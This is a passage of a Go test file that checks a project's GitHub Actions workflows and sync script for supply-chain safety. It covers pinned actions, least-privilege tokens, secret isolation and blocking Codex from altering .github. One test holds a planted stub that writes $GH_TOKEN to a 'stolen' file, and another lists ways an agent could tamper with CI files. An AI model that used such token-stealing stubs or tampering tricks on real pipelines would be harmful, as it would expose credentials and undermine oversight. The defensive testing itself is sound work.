// Package ci_test checks the workflows and scripts under .github, which go
// test can't reach from inside because it ignores dot directories.
package ci_test

import (
	"context"
	"maps"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"
)

const (
	ciWorkflow   = ".github/workflows/ci.yml"
	syncWorkflow = ".github/workflows/upstream-sync.yml"
	syncScript   = ".github/upstream-sync/sync.sh"

	gofmtStep = "Verify Changed Files Formatting (gofmt)"

	commandTimeout = time.Minute
)

// requireShell skips the test only where the tools the workflows themselves
// depend on are missing.
func requireShell(t *testing.T) {
	t.Helper()
	for _, tool := range []string{"bash", "git"} {
		if _, err := exec.LookPath(tool); err != nil {
			t.Skipf("%s is not installed: %v", tool, err)
		}
	}
}

func readFile(t *testing.T, path string) string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func indentOf(line string) int { return len(line) - len(strings.TrimLeft(line, " ")) }

func isBlank(line string) bool { return strings.TrimSpace(line) == "" }

func isComment(line string) bool { return strings.HasPrefix(strings.TrimSpace(line), "#") }

// blockAfter returns the lines nested under lines[at], which is all this file
// needs from YAML: the workflows only use block style, so nesting is indentation.
func blockAfter(lines []string, at int) []string {
	var block []string
	for _, line := range lines[at+1:] {
		if !isBlank(line) && indentOf(line) <= indentOf(lines[at]) {
			break
		}
		block = append(block, line)
	}
	return block
}

func stepLines(t *testing.T, workflow, name string) []string {
	t.Helper()
	lines := strings.Split(readFile(t, workflow), "\n")
	for i, line := range lines {
		if strings.TrimSpace(line) == "- name: "+name {
			return blockAfter(lines, i)
		}
	}
	t.Fatalf("%s has no step named %q", workflow, name)
	return nil
}

// runBlock returns a step's run: script as bash would receive it. It handles a
// one-line run: as well as a block.
func runBlock(step []string) string {
	for i, line := range step {
		trimmed := strings.TrimSpace(line)
		if trimmed == "run: |" {
			block := blockAfter(step, i)
			strip := indentOf(block[0])
			var script strings.Builder
			for _, line := range block {
				script.WriteString(strings.TrimPrefix(line, strings.Repeat(" ", strip)))
				script.WriteByte('\n')
			}
			return script.String()
		}
		if command, ok := strings.CutPrefix(trimmed, "run: "); ok {
			return command + "\n"
		}
	}
	return ""
}

// cleanEnv keeps the runner's own GITHUB_*, GIT_* and sync.sh variables away
// from what a test runs, so the test can't write to the real job's outputs and
// git only sees the temporary repository.
func cleanEnv(extra ...string) []string {
	env := []string{
		"PATH=" + os.Getenv("PATH"),
		"HOME=" + os.TempDir(),
		"GIT_CONFIG_GLOBAL=" + os.DevNull,
		"GIT_CONFIG_NOSYSTEM=1",
		"GIT_AUTHOR_NAME=ci test",
		"GIT_AUTHOR_EMAIL=ci@example.com",
		"GIT_COMMITTER_NAME=ci test",
		"GIT_COMMITTER_EMAIL=ci@example.com",
	}
	return append(env, extra...)
}

func command(t *testing.T, dir string, env []string, name string, args ...string) *exec.Cmd {
	t.Helper()
	ctx, cancel := context.WithTimeout(t.Context(), commandTimeout)
	t.Cleanup(cancel)
	cmd := exec.CommandContext(ctx, name, args...)
	cmd.Dir = dir
	cmd.Env = cleanEnv(env...)
	return cmd
}

func git(t *testing.T, dir string, args ...string) string {
	t.Helper()
	out, err := command(t, dir, nil, "git", args...).CombinedOutput()
	if err != nil {
		t.Fatalf("git %s: %v\n%s", strings.Join(args, " "), err, out)
	}
	return strings.TrimSpace(string(out))
}

// bashE runs script the way GitHub runs a step that doesn't name a shell.
func bashE(t *testing.T, dir, script string, env ...string) (string, error) {
	t.Helper()
	path := filepath.Join(t.TempDir(), "step.sh")
	writeFile(t, path, script)
	out, err := command(t, dir, env, "bash", "-e", path).CombinedOutput()
	return string(out), err
}

const (
	formattedGo   = "package a\n\nvar X = 1\n"
	unformattedGo = "package a\nvar   X = 1\n"
	// Unlike the file added beside it, so that git doesn't call this a rename
	// and the deletion stays in the diff.
	goneGo = "package gone\n\nfunc Deleted() string {\n\treturn \"nothing like the others\"\n}\n"
)

// gofmtRepo returns a repository whose HEAD, on top of main, deletes one Go
// file, and adds another with a space in its name holding spaced.
func gofmtRepo(t *testing.T, spaced string) string {
	t.Helper()
	dir := t.TempDir()
	git(t, dir, "init", "-q", "-b", "main")
	writeFile(t, filepath.Join(dir, "gone.go"), goneGo)
	git(t, dir, "add", "-A")
	git(t, dir, "commit", "-q", "-m", "base")
	git(t, dir, "update-ref", "refs/remotes/origin/main", "HEAD")
	git(t, dir, "rm", "-q", "gone.go")
	writeFile(t, filepath.Join(dir, "sub dir", "has space.go"), spaced)
	git(t, dir, "add", "-A")
	git(t, dir, "commit", "-q", "-m", "change")
	return dir
}

func TestGofmtStepAcceptsDeletedFilesAndSpacesInNames(t *testing.T) {
	requireShell(t)
	script := runBlock(stepLines(t, ciWorkflow, gofmtStep))
	for _, event := range []string{"pull_request", "push"} {
		t.Run(event, func(t *testing.T) {
			dir := gofmtRepo(t, formattedGo)
			out, err := bashE(t, dir, script, "GITHUB_EVENT_NAME="+event, "BASE_REF=main")
			if err != nil {
				t.Fatalf("step failed on a clean change: %v\n%s", err, out)
			}
		})
	}
}

func TestGofmtStepNamesUnformattedFileWithSpaceInName(t *testing.T) {
	requireShell(t)
	script := runBlock(stepLines(t, ciWorkflow, gofmtStep))
	for _, event := range []string{"pull_request", "push"} {
		t.Run(event, func(t *testing.T) {
			dir := gofmtRepo(t, unformattedGo)
			out, err := bashE(t, dir, script, "GITHUB_EVENT_NAME="+event, "BASE_REF=main")
			if err == nil {
				t.Fatalf("step passed an unformatted file:\n%s", out)
			}
			if !strings.Contains(out, "sub dir/has space.go") {
				t.Fatalf("step didn't name the file:\n%s", out)
			}
		})
	}
}

func TestGofmtStepAcceptsChangeWithoutGoFiles(t *testing.T) {
	requireShell(t)
	script := runBlock(stepLines(t, ciWorkflow, gofmtStep))
	dir := gofmtRepo(t, formattedGo)
	writeFile(t, filepath.Join(dir, "notes.md"), "notes\n")
	git(t, dir, "add", "-A")
	git(t, dir, "commit", "-q", "-m", "docs")
	if out, err := bashE(t, dir, script, "GITHUB_EVENT_NAME=push", "BASE_REF="); err != nil {
		t.Fatalf("step failed with no Go files to check: %v\n%s", err, out)
	}
}

func TestGofmtStepFailsWhenTheDiffFails(t *testing.T) {
	requireShell(t)
	script := runBlock(stepLines(t, ciWorkflow, gofmtStep))
	dir := gofmtRepo(t, unformattedGo)
	out, err := bashE(t, dir, script, "GITHUB_EVENT_NAME=pull_request", "BASE_REF=no-such-branch")
	if err == nil {
		t.Fatalf("step passed without being able to list the changes:\n%s", out)
	}
}

func TestGofmtStepTakesBaseRefFromEnv(t *testing.T) {
	step := stepLines(t, ciWorkflow, gofmtStep)
	if script := runBlock(step); strings.Contains(script, "${{") {
		t.Errorf("a branch name is attacker-controlled, but the script expands one directly:\n%s", script)
	}
	if !strings.Contains(strings.Join(step, "\n"), "BASE_REF: ${{ github.base_ref }}") {
		t.Errorf("env doesn't pass github.base_ref as BASE_REF:\n%s", strings.Join(step, "\n"))
	}
}

func workflows(t *testing.T) []string {
	t.Helper()
	paths, err := filepath.Glob(".github/workflows/*.yml")
	if err != nil {
		t.Fatal(err)
	}
	if len(paths) == 0 {
		t.Fatal("no workflows found; is the test running from the repository root?")
	}
	return paths
}

func TestActionsArePinnedToCommits(t *testing.T) {
	uses := regexp.MustCompile(`^\s*(?:- )?uses:\s*(\S+)(.*)$`)
	pinned := regexp.MustCompile(`^[\w.-]+/[\w./-]+@[0-9a-f]{40}$`)
	version := regexp.MustCompile(`^\s+# v\d+(\.\d+)*$`)
	var seen int
	for _, path := range workflows(t) {
		for n, line := range strings.Split(readFile(t, path), "\n") {
			match := uses.FindStringSubmatch(line)
			if match == nil {
				continue
			}
			seen++
			if !pinned.MatchString(match[1]) {
				t.Errorf("%s:%d: %s isn't pinned to a commit", path, n+1, match[1])
			}
			if !version.MatchString(match[2]) {
				t.Errorf("%s:%d: %s has no # vN comment", path, n+1, match[1])
			}
		}
	}
	if seen == 0 {
		t.Fatal("found no uses: lines")
	}
}

// topLevelPermissions returns the workflow's top-level permissions, one
// "scope: access" per entry, or the scalar value as the only entry.
func topLevelPermissions(t *testing.T, path string) []string {
	t.Helper()
	lines := strings.Split(readFile(t, path), "\n")
	for i, line := range lines {
		if scalar, ok := strings.CutPrefix(line, "permissions:"); ok {
			if scalar = strings.TrimSpace(scalar); scalar != "" {
				return []string{scalar}
			}
			var entries []string
			for _, entry := range blockAfter(lines, i) {
				if !isBlank(entry) {
					entries = append(entries, strings.TrimSpace(entry))
				}
			}
			return entries
		}
	}
	t.Fatalf("%s sets no top-level permissions", path)
	return nil
}

func TestTopLevelPermissionsAreReadOnly(t *testing.T) {
	for _, path := range workflows(t) {
		for _, entry := range topLevelPermissions(t, path) {
			if strings.Contains(entry, "write") {
				t.Errorf("%s: top-level permissions grant %q to every job", path, entry)
			}
		}
	}
}

// jobBlocks returns each job's lines by job name.
func jobBlocks(t *testing.T, path string) map[string][]string {
	t.Helper()
	lines := strings.Split(readFile(t, path), "\n")
	for i, line := range lines {
		if line != "jobs:" {
			continue
		}
		jobs := make(map[string][]string)
		block := blockAfter(lines, i)
		for j, entry := range block {
			if indentOf(entry) == 2 && !isBlank(entry) && !isComment(entry) {
				jobs[strings.TrimSuffix(strings.TrimSpace(entry), ":")] = blockAfter(block, j)
			}
		}
		return jobs
	}
	t.Fatalf("%s has no jobs", path)
	return nil
}

func TestOnlyJobsThatPushCanWrite(t *testing.T) {
	jobs := jobBlocks(t, syncWorkflow)
	if len(jobs) == 0 {
		t.Fatal("found no jobs")
	}
	for name, lines := range jobs {
		text := strings.Join(lines, "\n")
		pushes := strings.Contains(text, `sync.sh" finalize`) || strings.Contains(text, `sync.sh" save-failed`)
		writes := regexp.MustCompile(`(?m)^    permissions:\n      contents: write$`).MatchString(text)
		if pushes != writes {
			t.Errorf("job %s: pushes=%v but has contents: write=%v", name, pushes, writes)
		}
	}
}

// jobSteps returns each step of a job, its first line included.
func jobSteps(job []string) [][]string {
	var steps [][]string
	for i, line := range job {
		if indentOf(line) == 6 && strings.HasPrefix(strings.TrimSpace(line), "- ") {
			steps = append(steps, append([]string{line}, blockAfter(job, i)...))
		}
	}
	return steps
}

// stepAction returns what a step does: its uses: or its run: line.
func stepAction(step []string) string {
	for _, line := range step {
		trimmed := strings.TrimPrefix(strings.TrimSpace(line), "- ")
		if strings.HasPrefix(trimmed, "uses: ") || strings.HasPrefix(trimmed, "run: ") {
			return trimmed
		}
	}
	return ""
}

func holdsWriteToken(job []string) bool {
	text := strings.Join(job, "\n")
	return strings.Contains(text, ": write") || strings.Contains(text, "github.token") ||
		strings.Contains(text, "GITHUB_TOKEN") || strings.Contains(text, "GH_TOKEN")
}

// The merged tree is code that upstream and Codex wrote, and building or
// testing it runs that code. Keeping the token out of that one step is not
// enough: what has run on a runner can leave a BASH_ENV in $GITHUB_ENV or
// replace the copy of sync.sh, and then runs inside the later step that is
// given the token. So the job with the token may do nothing but fetch a bundle
// and push.
func TestJobHoldingTheWriteTokenRunsNoMergedCode(t *testing.T) {
	allowed := []*regexp.Regexp{
		regexp.MustCompile(`^uses: actions/checkout@[0-9a-f]{40} # v\d+$`),
		regexp.MustCompile(`^uses: actions/download-artifact@[0-9a-f]{40} # v\d+$`),
		regexp.MustCompile(`^run: git archive "\$GITHUB_SHA" \.github/upstream-sync \| tar -x -C "\$RUNNER_TEMP" --strip-components=1$`),
		regexp.MustCompile(`^run: '"\$RUNNER_TEMP/upstream-sync/sync\.sh" (finalize|save-failed)'$`),
	}
	var holders, others int
	for name, job := range jobBlocks(t, syncWorkflow) {
		if !holdsWriteToken(job) {
			others++
			continue
		}
		holders++
		steps := jobSteps(job)
		if len(steps) == 0 {
			t.Errorf("job %s: found no steps", name)
		}
		for _, step := range steps {
			action := stepAction(step)
			if !slices.ContainsFunc(allowed, func(re *regexp.Regexp) bool { return re.MatchString(action) }) {
				t.Errorf("job %s holds the token that can push, and has a step that does more than fetch a bundle and push it:\n%s", name, strings.Join(step, "\n"))
			}
		}
	}
	if holders != 1 || others == 0 {
		t.Errorf("%d jobs hold the write token and %d don't; want the push job alone to hold it", holders, others)
	}
}

// A test run pushes nothing, and a failed sync, codex or verify job still has
// its attempt saved, so the push job has to wait for all of them and run after
// a failure. It pushes the merge only if every job that ran succeeded: a
// skipped verify job means a clean merge only if the codex job was skipped too.
func TestPushJobRunsAfterTheOtherJobsExceptOnTestRuns(t *testing.T) {
	push := jobBlocks(t, syncWorkflow)["push"]
	if push == nil {
		t.Fatalf("%s has no push job", syncWorkflow)
	}
	text := strings.Join(push, "\n")
	for _, want := range []string{
		"\n    needs: [sync, codex, verify]\n",
		"\n    if: ${{ !cancelled() && needs.sync.outputs.pending == 'true' && inputs.test_branch == '' }}\n",
	} {
		if !strings.Contains("\n"+text+"\n", want) {
			t.Errorf("the push job has no line %q:\n%s", strings.TrimSpace(want), text)
		}
	}
	conditions := map[string]string{
		"finalize":    "if: needs.sync.result == 'success' && (needs.verify.result == 'success' || (needs.codex.result == 'skipped' && needs.verify.result == 'skipped'))",
		"save-failed": "if: needs.sync.result == 'failure' || needs.codex.result == 'failure' || needs.verify.result == 'failure'",
	}
	for _, step := range jobSteps(push) {
		_, command, _ := strings.Cut(strings.TrimSuffix(stepAction(step), "'"), `sync.sh" `)
		want, pushes := conditions[command]
		if !pushes {
			continue
		}
		delete(conditions, command)
		if !slices.ContainsFunc(step, func(line string) bool { return strings.TrimSpace(line) == want }) {
			t.Errorf("the %s step doesn't run on %q:\n%s", command, want, strings.Join(step, "\n"))
		}
	}
	for command := range conditions {
		t.Errorf("the push job has no %s step", command)
	}
}

// stepInput returns the value of a step's with: input.
func stepInput(step []string, name string) string {
	for _, line := range step {
		if value, ok := strings.CutPrefix(strings.TrimSpace(line), name+": "); ok {
			return value
		}
	}
	return ""
}

const (
	copyScripts    = `run: git archive "$GITHUB_SHA" .github/upstream-sync | tar -x -C "$RUNNER_TEMP" --strip-components=1`
	downloadAction = "uses: actions/download-artifact@"
	runnerTemp     = "${{ runner.temp }}"
)

// artifactDir returns where a job unpacks the named artifact, as a directory
// of the runner's temp directory.
func artifactDir(t *testing.T, job, artifact string) string {
	t.Helper()
	for _, step := range jobSteps(jobBlocks(t, syncWorkflow)[job]) {
		if !strings.HasPrefix(stepAction(step), downloadAction) || stepInput(step, "name") != artifact {
			continue
		}
		dir, ok := strings.CutPrefix(stepInput(step, "path"), runnerTemp+"/")
		if !ok || dir == "" {
			t.Fatalf("job %s unpacks %s at %q, which is no directory of its own under the temp directory", job, artifact, stepInput(step, "path"))
		}
		return dir
	}
	t.Fatalf("job %s of %s downloads no artifact named %s", job, syncWorkflow, artifact)
	return ""
}

// The job that made an artifact decides what files are in it, and that job has
// run the merged code. Unpacked over the temp directory, an artifact with an
// upstream-sync/sync.sh replaces the script that the job then runs, in the
// push job with the token. So every artifact goes to a directory of its own,
// and the script that a job runs is still the one it copied from its commit.
func TestArtifactsAreUnpackedWhereNothingIsRun(t *testing.T) {
	requireShell(t)
	const planted = "#!/bin/sh\necho \"$GH_TOKEN\" >\"$RUNNER_TEMP/stolen\"\n"
	// The commit that the workflow runs from, with this checkout's script.
	checkout := t.TempDir()
	script := readFile(t, syncScript)
	git(t, checkout, "init", "-q", "-b", "main")
	writeFile(t, filepath.Join(checkout, filepath.FromSlash(syncScript)), script)
	git(t, checkout, "add", "-A")
	git(t, checkout, "commit", "-q", "-m", "scripts")
	head := git(t, checkout, "rev-parse", "HEAD")
	var downloads int
	for name, job := range jobBlocks(t, syncWorkflow) {
		temp := t.TempDir()
		var copied bool
		var ran []string
		for _, step := range jobSteps(job) {
			action := stepAction(step)
			switch {
			case action == copyScripts:
				out, err := bashE(t, checkout, strings.TrimPrefix(action, "run: ")+"\n", "RUNNER_TEMP="+temp, "GITHUB_SHA="+head)
				if err != nil {
					t.Fatalf("job %s can't copy its scripts: %v\n%s", name, err, out)
				}
				copied = true
			case strings.HasPrefix(action, downloadAction):
				downloads++
				artifact := stepInput(step, "name")
				dir := artifactDir(t, name, artifact)
				if dir != artifact || strings.ContainsAny(dir, "/.") {
					t.Errorf("job %s unpacks %s in %q, want a directory named after it", name, artifact, dir)
				}
				// What the action does with a named artifact: its files go
				// under path:, over whatever is there.
				for _, file := range []string{"sync.sh", "upstream-sync/sync.sh", "merged.bundle", "failed.bundle", "merge.bundle"} {
					writeFile(t, filepath.Join(temp, dir, file), planted)
				}
			case strings.Contains(action, `sync.sh" `):
				if !copied {
					t.Fatalf("job %s runs sync.sh before it has copied it:\n%s", name, strings.Join(step, "\n"))
				}
				if !strings.HasPrefix(action, `run: '"$RUNNER_TEMP/upstream-sync/sync.sh" `) {
					t.Errorf("job %s runs a sync.sh that is not the one it copied: %s", name, action)
				}
				ran = append(ran, action)
				if got := readFile(t, filepath.Join(temp, "upstream-sync", "sync.sh")); got != script {
					t.Errorf("job %s runs %s after an artifact has replaced the script copied from the workflow's commit:\n%s", name, action, got)
				}
			}
		}
		if len(ran) == 0 {
			t.Errorf("job %s never runs sync.sh", name)
		}
	}
	if downloads < 3 {
		t.Errorf("found %d download steps; want the codex, verify and push jobs to have one each", downloads)
	}
}

func givenASecret(step []string) bool {
	text := strings.Join(step, "\n")
	return strings.Contains(text, "secrets.") || strings.Contains(text, "github.token") ||
		strings.Contains(text, "GITHUB_TOKEN") || strings.Contains(text, "GH_TOKEN")
}

// What has run on a runner can leave a process behind, or change an action
// under _actions, and so reach whatever a later step of the job is given.
// Keeping a secret out of the step that runs the merged code is not enough: no
// step before the one with the secret may run it either. The Codex step is the
// one place where a secret and code that isn't ours meet, and there
// codex-action itself keeps the key from what Codex runs.
func TestNoStepBeforeASecretRunsMergedCode(t *testing.T) {
	// Each of these runs nothing from the merged tree. remerge is shown not to
	// by TestRemergeRunsNothingFromTheMergedTree.
	harmless := []*regexp.Regexp{
		regexp.MustCompile(`^uses: actions/checkout@[0-9a-f]{40} # v\d+$`),
		regexp.MustCompile(`^uses: actions/setup-go@[0-9a-f]{40} # v\d+$`),
		regexp.MustCompile(`^uses: actions/download-artifact@[0-9a-f]{40} # v\d+$`),
		regexp.MustCompile("^" + regexp.QuoteMeta(copyScripts) + "$"),
		regexp.MustCompile(`^run: '"\$RUNNER_TEMP/upstream-sync/sync\.sh" remerge'$`),
	}
	holders := []*regexp.Regexp{
		regexp.MustCompile(`^uses: openai/codex-action@[0-9a-f]{40} # v\d+$`),
		regexp.MustCompile(`^run: '"\$RUNNER_TEMP/upstream-sync/sync\.sh" (finalize|save-failed)'$`),
	}
	matches := func(patterns []*regexp.Regexp, action string) bool {
		return slices.ContainsFunc(patterns, func(re *regexp.Regexp) bool { return re.MatchString(action) })
	}
	secrets := make(map[string]int)
	for name, job := range jobBlocks(t, syncWorkflow) {
		steps := jobSteps(job)
		last := -1
		for i, step := range steps {
			if givenASecret(step) {
				last = i
				secrets[name]++
				if action := stepAction(step); !matches(holders, action) {
					t.Errorf("job %s gives a secret to a step that is neither Codex nor a push:\n%s", name, strings.Join(step, "\n"))
				}
			}
		}
		for _, step := range steps[:last+1] {
			if action := stepAction(step); !givenASecret(step) && !matches(harmless, action) {
				t.Errorf("job %s runs %q before a step that is given a secret, and it is not known to run nothing from the merge", name, action)
			}
		}
		// The checks are the merged code. A job that runs them has no secret
		// anywhere, whatever the order of its steps.
		text := strings.Join(job, "\n")
		checks := strings.Contains(text, `sync.sh" prepare`) || strings.Contains(text, `sync.sh" verify`)
		if checks && (last >= 0 || holdsWriteToken(job) || strings.Contains(text, "secrets.")) {
			t.Errorf("job %s runs the checks on the merged code and is given a secret", name)
		}
	}
	if want := map[string]int{"codex": 1, "push": 2}; !maps.Equal(secrets, want) {
		t.Errorf("steps given a secret, by job: %v, want %v", secrets, want)
	}
	if text := readFile(t, syncWorkflow); strings.Count(text, "secrets.") != 1 || !strings.Contains(text, "openai-api-key: ${{ secrets.OPENAI_API_KEY }}") {
		t.Error("OPENAI_API_KEY is given to something other than the one Codex step")
	}
}

// syncFunctions returns sync.sh without the dispatch at its end, so a test can
// replace what it can't run, then call the rest for real.
func syncFunctions(t *testing.T) string {
	t.Helper()
	head, _, found := strings.Cut(readFile(t, syncScript), "\ncase \"${1:-}\" in\n")
	if !found {
		t.Fatalf("%s no longer ends in the dispatch this test cuts off", syncScript)
	}
	here, err := filepath.Abs(filepath.Dir(syncScript))
	if err != nil {
		t.Fatal(err)
	}
	return head + "\nHERE='" + here + `'
go() { echo "$(basename "$PWD"): go $*" >>"$RUNNER_TEMP/go.log"; }
`
}

// syncRepo returns a fork with a .github directory, cloned from an upstream
// that has since moved on, plus the variables the workflow gives sync.sh.
func syncRepo(t *testing.T) (fork string, env []string) {
	t.Helper()
	dir := t.TempDir()
	upstream := filepath.Join(dir, "upstream")
	if err := os.Mkdir(upstream, 0o755); err != nil {
		t.Fatal(err)
	}
	git(t, upstream, "init", "-q", "-b", "main")
	writeFile(t, filepath.Join(upstream, "go.mod"), "module example.com/a\n")
	writeFile(t, filepath.Join(upstream, "code.go"), formattedGo)
	writeFile(t, filepath.Join(upstream, ".github", "workflows", "ci.yml"), "name: fork\n")
	git(t, upstream, "add", "-A")
	git(t, upstream, "commit", "-q", "-m", "base")

	fork = filepath.Join(dir, "fork")
	git(t, dir, "clone", "-q", upstream, fork)
	writeFile(t, filepath.Join(fork, "api", "wasm", "keep.go"), formattedGo)
	git(t, fork, "add", "-A")
	git(t, fork, "commit", "-q", "-m", "fork")

	writeFile(t, filepath.Join(upstream, "code.go"), formattedGo+"\nvar Y = 2\n")
	git(t, upstream, "add", "-A")
	git(t, upstream, "commit", "-q", "-m", "upstream")

	temp := t.TempDir()
	return fork, []string{
		"RUNNER_TEMP=" + temp,
		"GITHUB_OUTPUT=" + filepath.Join(temp, "output"),
		"GITHUB_STEP_SUMMARY=" + filepath.Join(temp, "summary"),
		"UPSTREAM_URL=" + upstream,
	}
}

func envValue(t *testing.T, env []string, name string) string {
	t.Helper()
	for _, entry := range env {
		if value, ok := strings.CutPrefix(entry, name+"="); ok {
			return value
		}
	}
	t.Fatalf("no %s in %v", name, env)
	return ""
}

// sendToCodex makes prepare take the path that ends in a Codex run, with a
// merge in which upstream has changed .github. The real merge is replaced
// because it needs GNU sed, which macOS runners don't have.
const sendToCodex = `
merge_translated() { echo 'name: changed upstream' >.github/workflows/ci.yml; }
normalize() { :; }
checks() { echo checks failed; return 1; }
`

// afterPrepare sets what the workflow passes on from the outputs of prepare
// or remerge to the later steps of the same job.
const afterPrepare = `
UPSTREAM=$(git rev-parse quaadgras/main)
BASE=$(git merge-base HEAD "$UPSTREAM")
`

// syncJobAsksForCodex runs the sync job's prepare in fork, with the given
// replacements for what a test can't run, and fails the test if it doesn't
// send the merge to Codex.
func syncJobAsksForCodex(t *testing.T, fork string, env []string, stubs string) {
	t.Helper()
	out, err := bashE(t, fork, syncFunctions(t)+stubs+"prepare\n", env...)
	if err != nil {
		t.Fatalf("the sync job failed: %v\n%s", err, out)
	}
	if !strings.Contains(readFile(t, envValue(t, env, "GITHUB_OUTPUT")), "needs_codex=true") {
		t.Fatalf("prepare didn't ask for Codex:\n%s", out)
	}
}

// codexJob runs the codex job after a sync job that asked for it: a fresh
// checkout of origin, the log that the sync job uploaded, remerge, whatever
// the test has Codex do to the checkout, and then the given steps.
func codexJob(t *testing.T, origin string, syncEnv []string, stubs, codex, steps string) (dir string, env []string, out string, err error) {
	t.Helper()
	dir, env = nextJob(t, origin)
	env = append(env, "UPSTREAM_URL="+envValue(t, syncEnv, "UPSTREAM_URL"))
	// The workflow gives both jobs the same input.
	if slices.Contains(syncEnv, "FORCE_CODEX=true") {
		env = append(env, "FORCE_CODEX=true")
	}
	download(t, "codex", env, "codex-input", filepath.Join(envValue(t, syncEnv, "RUNNER_TEMP"), "codex-input"), "upstream-sync.log")
	out, err = bashE(t, dir, syncFunctions(t)+stubs+"remerge\n"+afterPrepare+codex+steps, env...)
	return dir, env, out, err
}

// The merge can change .github, and package only refuses what Codex did to it
// after that. Whether such a merge is pushed is for the push job to say.
func TestSyncAcceptsUpstreamChangesToGithub(t *testing.T) {
	requireShell(t)
	fork, env := syncRepo(t)
	origin := pushableOrigin(t, fork)
	syncJobAsksForCodex(t, fork, env, sendToCodex)
	dir, _, out, err := codexJob(t, origin, env, sendToCodex, "", "package_result\n")
	if err != nil {
		t.Fatalf("the merge's own change to .github was rejected: %v\n%s", err, out)
	}
	if got := git(t, dir, "show", "codex-result:.github/workflows/ci.yml"); got != "name: changed upstream" {
		t.Errorf("the packaged merge has %q for upstream's change to .github", got)
	}
}

// "Don't change anything under .github. The run is rejected if you do." A
// file is changed by a new mode or by becoming a link as much as by new
// bytes, and a comparison that follows links and ignores modes sees neither.
func TestSyncRejectsCodexChangingGithub(t *testing.T) {
	requireShell(t)
	const workflow = ".github/workflows/ci.yml"
	for name, codex := range map[string]string{
		"file edited":                       "echo 'name: changed by codex' >" + workflow + "\n",
		"file made executable":              "chmod +x " + workflow + "\n",
		"file replaced by a link to a copy": "cp " + workflow + " copy.yml\nln -sf \"$PWD/copy.yml\" " + workflow + "\n",
		"file added":                        "echo 'name: new' >.github/workflows/new.yml\n",
		"file added that git ignores":       "echo '*.log' >.gitignore\necho x >.github/build.log\n",
		"file removed":                      "rm " + workflow + "\n",
		"directory replaced by a link":      "mv .github elsewhere\nln -s elsewhere .github\n",
		"directory removed":                 "rm -r .github\n",
	} {
		t.Run(name, func(t *testing.T) {
			fork, env := syncRepo(t)
			origin := pushableOrigin(t, fork)
			syncJobAsksForCodex(t, fork, env, sendToCodex)
			dir, codexEnv, out, err := codexJob(t, origin, env, sendToCodex, codex, "package_result\n")
			if err == nil {
				t.Fatalf("package accepted a change Codex made to .github, and committed it as\n%s", git(t, dir, "ls-tree", "-r", "codex-result", ".github"))
			}
			if !strings.Contains(out, "Codex changed .github") {
				t.Fatalf("package failed for another reason: %v\n%s", err, out)
			}
			if _, err := os.Stat(filepath.Join(envValue(t, codexEnv, "RUNNER_TEMP"), "merge.bundle")); err == nil {
				t.Error("package bundled the merge for the verify job all the same")
			}
		})
	}
}

// What Codex may change is everything else, links and modes included.
func TestSyncAcceptsWhatCodexChangesOutsideGithub(t *testing.T) {
	requireShell(t)
	fork, env := syncRepo(t)
	origin := pushableOrigin(t, fork)
	syncJobAsksForCodex(t, fork, env, sendToCodex)
	const codex = "echo 'var Z = 3' >>code.go\nchmod +x code.go\nln -s code.go link.go\n"
	dir, _, out, err := codexJob(t, origin, env, sendToCodex, codex, "package_result\n")
	if err != nil {
		t.Fatalf("package rejected changes outside .github: %v\n%s", err, out)
	}
	tree := git(t, dir, "ls-tree", "-r", "codex-result")
	for _, want := range []string{"100755 blob", "120000 blob"} {
		if !strings.Contains(tree, want) {
			t.Errorf("the packaged merge has no %s:\n%s", want, tree)
		}
	}
}

func TestSyncPromptKeepsSedSpecialCharactersInReason(t *testing.T) {
	requireShell(t)
	const path = `a|b&c\d.go`
	fork, env := syncRepo(t)
	origin := pushableOrigin(t, fork)
	stubs := sendToCodex + `unmerged() { printf '%s\n' 'a|b&c\d.go'; }` + "\n"
	syncJobAsksForCodex(t, fork, env, stubs)
	_, codexEnv, out, err := codexJob(t, origin, env, stubs, "", "")
	if err != nil {
		t.Fatalf("remerge failed on a conflicted path: %v\n%s", err, out)
	}
	prompt := readFile(t, filepath.Join(envValue(t, codexEnv, "RUNNER_TEMP"), "codex-prompt.md"))
	if want := "the merge conflicted in: " + path + "."; !strings.Contains(prompt, want) {
		t.Fatalf("prompt doesn't contain %q:\n%s", want, prompt)
	}
}

func TestCIChecksWasmModule(t *testing.T) {
	lines := strings.Split(readFile(t, ciWorkflow), "\n")
	var scripts []string
	for i, line := range lines {
		if !strings.HasPrefix(strings.TrimSpace(line), "- name: ") {
			continue
		}
		step := blockAfter(lines, i)
		if strings.Contains(strings.Join(step, "\n"), "working-directory: api/wasm") {
			scripts = append(scripts, runBlock(step))
		}
	}
	all := strings.Join(scripts, "\n")
	for _, want := range []string{"go mod tidy", "go vet -structtag=false ./...", "go test -v -race ./...", "go build ./..."} {
		if !strings.Contains(all, want) {
			t.Errorf("no step in api/wasm runs %q", want)
		}
	}
}

func TestSyncChecksWasmModule(t *testing.T) {
	requireShell(t)
	fork, env := syncRepo(t)
	stubs := "\nunmerged() { :; }\nchanged_go() { :; }\n"
	out, err := bashE(t, fork, syncFunctions(t)+stubs+"checks\n", env...)
	if err != nil {
		t.Fatalf("checks failed: %v\n%s", err, out)
	}
	log := readFile(t, filepath.Join(envValue(t, env, "RUNNER_TEMP"), "go.log"))
	for _, want := range []string{
		"wasm: go build ./...",
		"wasm: go vet -structtag=false ./...",
		"wasm: go test -race ./...",
	} {
		if !strings.Contains(log, want) {
			t.Errorf("checks never ran %q:\n%s", want, log)
		}
	}
}

func TestSyncChecksFailWhenWasmModuleFails(t *testing.T) {
	requireShell(t)
	fork, env := syncRepo(t)
	stubs := `
unmerged() { :; }
changed_go() { :; }
go() { [ "$(basename "$PWD")" != wasm ]; }
`
	if out, err := bashE(t, fork, syncFunctions(t)+stubs+"checks\n", env...); err == nil {
		t.Fatalf("checks passed with api/wasm failing:\n%s", out)
	}
}

func TestSyncDownloadsAndTidiesWasmModule(t *testing.T) {
	requireShell(t)
	fork, env := syncRepo(t)
	origin := pushableOrigin(t, fork)
	syncJobAsksForCodex(t, fork, env, sendToCodex)
	_, codexEnv, out, err := codexJob(t, origin, env, sendToCodex, "", "")
	if err != nil {
		t.Fatalf("remerge failed: %v\n%s", err, out)
	}
